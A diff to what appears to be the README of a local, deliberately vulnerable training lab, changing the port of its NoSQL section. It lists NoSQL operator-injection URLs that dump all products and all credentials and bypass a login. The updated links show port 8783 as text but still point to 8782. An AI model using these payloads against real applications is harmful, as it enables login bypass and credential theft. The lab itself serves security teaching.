@@ -114,13 +114,13 @@ Form to choose a customer showing soft skills
 
 # NoSQL
 
-To get an overview of the examples goto http://127.0.0.1:8782/
+To get an overview of the examples goto http://127.0.0.1:8783/
 
 ## Get all products
 
-- [http://127.0.0.1:8782/products.php?product[$gt]=%22%22](http://127.0.0.1:8782/products.php?product[$gt]=%22%22)
-- [http://127.0.0.1:8782/products.php?product[$ne]=1](http://127.0.0.1:8782/products.php?product[$ne]=1)
+- [http://127.0.0.1:8783/products.php?product[$gt]=%22%22](http://127.0.0.1:8782/products.php?product[$gt]=%22%22)
+- [http://127.0.0.1:8783/products.php?product[$ne]=1](http://127.0.0.1:8782/products.php?product[$ne]=1)
 
 ## Get all credentials / Potential login bypass
 
-- [http://127.0.0.1:8782/users.php?user[$ne]=1&pass[$ne]=1](http://127.0.0.1:8782/users.php?user[$ne]=1&pass[$ne]=1)
+- [http://127.0.0.1:8783/users.php?user[$ne]=1&pass[$ne]=1](http://127.0.0.1:8782/users.php?user[$ne]=1&pass[$ne]=1)
